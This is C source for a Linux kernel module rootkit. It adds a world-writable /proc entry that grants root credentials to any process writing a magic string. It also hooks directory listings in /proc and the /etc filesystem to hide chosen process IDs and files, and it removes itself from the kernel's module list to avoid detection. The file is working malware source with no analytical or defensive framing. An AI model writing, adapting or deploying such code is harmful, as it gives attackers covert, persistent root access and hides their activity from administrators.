#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50
#define RT_NAME "891rt" 

MODULE_LICENSE("Dual BSD/GPL");
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];


void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
	module_hidden = !module_hidden;
}


static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}


static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, RT_NAME)) return 0;
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	proc_filldir_orig = filldir;
	return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	if (hide_files &&  !strncmp(name, "00_-_00", 7))
		return 0;
	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	fs_filldir_orig = filldir;
	return fs_readdir_orig(filp, dirent, fs_filldir_new);
}

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
{
	int size;
	
	sprintf(module_status,"   ");

	size = strlen(module_status);

	if (off >= size) return 0;
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;
}

static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
{
	if (!strncmp(buff, "yyxxxxxzzzz", MIN(11, count)))
	{
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} 

	else if (!strncmp(buff, "hp", MIN(2, count)))
	{
		if (current_pid < MAX_PIDS) 
			strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} 
	/*
	else if (!strncmp(buff, "up", MIN(2, count)))
	{
		if (current_pid > 0) 
			current_pid--;
	}
 
	else if (!strncmp(buff, "thf", MIN(3, count))) 
	{
		hide_files = !hide_files;
	}
 
	else if (!strncmp(buff, "mh", MIN(2, count)))
	{
		module_hide();
	}
 
	else if (!strncmp(buff, "ms", MIN(2, count))) 
	{
		module_show();
	}
	*/
        return count;
}


static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry(RT_NAME, NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_readdir_orig != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->readdir = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_readdir_orig != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->readdir = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void)
{
	proc_rtkit = create_proc_entry(RT_NAME, 0666, NULL);
	if (proc_rtkit == NULL) 
		return 0;
	proc_root = proc_rtkit->parent;
	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
		return 0;
	}
	proc_rtkit->read_proc = rtkit_read;
	proc_rtkit->write_proc = rtkit_write;
	
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_readdir_orig = proc_fops->readdir;
	set_addr_rw(proc_fops);
	proc_fops->readdir = proc_readdir_new;
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	
	etc_filp = filp_open("/etc", O_RDONLY, 0);
	if (etc_filp == NULL) return 0;
	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	
	fs_readdir_orig = fs_fops->readdir;
	set_addr_rw(fs_fops);
	fs_fops->readdir = fs_readdir_new;
	set_addr_ro(fs_fops);
	
	return 1;
}

static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		procfs_clean();
		fs_clean();
		return 1;
	}
	module_hide();
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
